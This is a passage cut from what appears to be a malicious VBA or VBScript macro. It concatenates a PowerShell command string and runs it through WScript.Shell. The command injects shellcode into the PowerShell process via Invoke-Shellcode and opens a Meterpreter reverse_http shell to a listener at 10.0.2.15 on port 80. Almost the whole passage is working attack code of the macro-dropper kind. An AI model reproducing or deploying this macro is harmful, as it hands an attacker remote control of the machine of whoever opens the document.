        C = C + "ellcode into the running PowerShell process!" ) )
"
        C = C + "        {
            Inject-LocalShellcode
      "
        C = C + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        C = C + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        C = C + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(C)
End Function
